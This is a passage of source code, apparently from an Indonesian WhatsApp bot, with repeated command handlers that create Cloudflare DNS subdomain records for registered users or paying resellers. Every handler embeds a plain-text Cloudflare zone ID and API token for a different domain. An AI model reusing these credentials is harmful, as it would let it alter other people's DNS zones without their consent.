               let zone = "a6c9cf9cd38077e52db6874200c5c0c4";
               let apitoken = "DyQW84WhtZwTfWZCanO-MQNd6gglRwDHOmK8KRF2";
               let tld = "panellku.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
   case 'domain26': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "512f917ecb9e0d4eb0085458fdcc95ee";
               let apitoken = "a4hizwK6UjIi8MBEscAOVNG-njTDfJejAhOJlOFh";
               let tld = "panellku.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
    case 'domain27': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "b268933cdea4ffd662bc56dd84e46e21";
               let apitoken = "v80Y6QMWDamHAg-u18z8IEMBp1kpodn_lZkyduJ8";
               let tld = "panellku.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break   
     case 'domain28': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "4e1c19a2687fe1a2505fecaf3de3e7ff";
               let apitoken = "p4oS8J-Tc0Rt9z4tgS3gdzbaG-aL0FQ0Ro1mpl-Q";
               let tld = "panellku.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break        
         case 'domain29': {
    if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "72fc614619292a5d6c86d3e736b14062";
               let apitoken = "MF2cgyOmXeFdrwpcTS4XRbYbDL9zsmF6XY6TIFlv";
               let tld = "panelkuu.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain30': {
    if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c8a876bc10af3ce5ab11f2209121cf63";
               let apitoken = "O8uR00EP6u4Rp9TtmwCSASwfkEHAIaNw2DVmIgAD";
               let tld = "panellku.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`┏━━━━━━━━━━━━━━━━━━━
┣ Ip = ${e['ip']}
┗━━━━━━━━━━━━━━━━━━━
┣ Username = ${e['name']}
┗━━━━━━━━━━━━━━━━━━━
┣ crate by = ${author}
┗━━━━━━━━━━━━━━━━━━━`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain31': {
    if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "ecfab91669cd9f1f269ff910ef37c4bc";
               let apitoken = "OwvvvI_MTLmsl2O5NnlzvPOfJfkNJlU2IAwA3wGH";
               let tld = "biistoreee.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
           case 'domain32': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "6e54db622bb8682bdf42316953b5401d";
               let apitoken = "OwvvvI_MTLmsl2O5NnlzvPOfJfkNJlU2IAwA3wGH";
               let tld = "biistoreee.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
	case 'domain33': {
    if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("maaf su fitur ini dapet di gunakan group tertentu")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "601cbd78e8141e5ffa37e5bcac5f1e00";
               let apitoken = "TXXi3Cz2NusjfQ4_KStk-mc-IaIKzCj_sINwPLm";
               let tld = "rulzxyxd.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`berhasil menambah domain\nip: ${e['ip']}\nhostname: ${e['name']}`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
case 'domain34': case 'domain35': {
     if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isOwner) return m.reply("maaf su fitur ini khusus tuan saya.")
     }
     break
          case 'domain36': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RafatharOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "44379cef53cb4d8b5e28c11d28efff19";
               let apitoken = "9OAjUqNDxN0EohV6BUh3AROVbLjiYwdzcp_0gGU1";
               let tld = "rizalshop.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain37': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RafatharOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "e0f9412065e53bd57bde671aa36345a9";
               let apitoken = "MDVzjxiioRJ9uO8UnGuvqIIcahrstb-mjlgECNbw";
               let tld = "panelku.link";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain38': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain Rafathar\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "74fc380e8c21521fdb09363ae57b8b92";
               let apitoken = "xGFeJ0uxY6G8xQKnpwDKKFpz_2umbCwddUSsNZEx";
               let tld = "sanzyy.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) m.reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else m.reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
            break
          case 'domain39': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!isPremium && !isOwner) return reply(mess.only.premium)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "0aec98100985db6fa9390b8983c1e9b8";
               let apitoken = "qKl5LyFBfNJgnI8n4ZDbgiL65OQMkEJL8GgITWs9";
               let tld = "home-panel.pw";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By RafatharOffcial⚡_*`);
             else reply(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
          case 'domain40': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
    if (!jangan) return m.reply("Fitur Ini Khusus Untuk Reseller Subdomain RafatharOffcial\nMau Join? Cuman 5.000 Ajaa\n\nHubungi Wa.me/6283183432282")
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "80eccb8365dd03f4cd3408ed221f0a30";
               let apitoken = "NZnnadMJfEmkr2amCyGZ1kb38XKaVJMHZGNVwi0z";
               let tld = "aswinxd.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return m.reply("mana host & ip nya?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return m.reply("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return m.reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
